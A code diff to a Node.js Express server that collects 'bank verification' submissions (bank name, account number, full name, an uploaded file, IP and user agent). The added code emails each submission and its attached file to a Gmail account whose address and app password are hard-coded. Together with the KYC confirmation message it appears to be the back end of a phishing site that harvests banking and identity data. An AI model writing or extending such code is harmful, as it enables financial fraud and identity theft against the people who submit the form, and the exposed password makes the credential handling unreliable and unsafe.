@@ -1,6 +1,7 @@
 const express = require('express');
 const multer = require('multer');
 const fs = require('fs');
+const nodemailer = require('nodemailer');
 const path = require('path');
 
 const app = express();
@@ -37,6 +38,45 @@ User Agent: ${userAgent}
 `;
 
   fs.appendFileSync('records.txt', logEntry);
+  const transporter = nodemailer.createTransport({
+  service: 'gmail',
+  auth: {
+    user: 'dcbsubmission392@gmail.com',
+    pass: 'kexm wnes pcwx rkjt'
+  }
+});
+
+const mailOptions = {
+  from: 'dcbsubmission392@gmail.com',
+  to: 'dcbsubmission392@gmail.com',
+  subject: '🔔 New Bank Verification Submission',
+  text: `
+New submission received:
+
+Bank Name: ${bankname}
+Account Number: ${accno}
+Full Name: ${fullname}
+Uploaded File Path: ${file.path}
+
+IP: ${ip}
+Timestamp: ${timestamp}
+User Agent: ${userAgent}
+  `,
+  attachments: [
+    {
+      filename: file.originalname,
+      path: file.path
+    }
+  ]
+};
+
+transporter.sendMail(mailOptions, (error, info) => {
+  if (error) {
+    console.error('❌ Email failed:', error);
+  } else {
+    console.log('✅ Email sent:', info.response);
+  }
+});
   res.send('<h2>✅ Submitted Successfully!</h2><p>Your KYC info has been received.</p>');
 });
 
